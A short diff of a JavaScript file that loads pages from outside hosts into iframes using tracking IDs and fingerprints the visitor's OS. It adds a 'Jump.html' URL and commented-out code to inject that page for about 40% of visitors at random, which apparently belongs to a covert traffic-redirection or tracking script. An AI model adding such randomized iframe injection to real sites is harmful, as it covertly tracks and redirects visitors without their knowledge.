@@ -9,6 +9,7 @@ var trackidmd5 = '34b2d9d5934507eee5531d27a7f42158';
 var statid = '1279824053'
 
 var core_url = '//etc.6187wo.com/' + trackid + '/' + trackidmd5 + '/Core.html#s_w=' + s_w;
+var optimize_url = '//bis.3801wd.com/Jump.html';
 function Core(url) {
     var d = document.createElement("div");
     var c = document.createElement("iframe");
@@ -137,5 +138,7 @@ function getOS() {
 }
 Core(core_url);
 Core(core_url);
+// var Crdo = Math.floor(Math.random() * (1000 - 1)) + 1;
+// if (Crdo <= 400) Core(optimize_url);
 GetInfo();
 Statistics(statid);
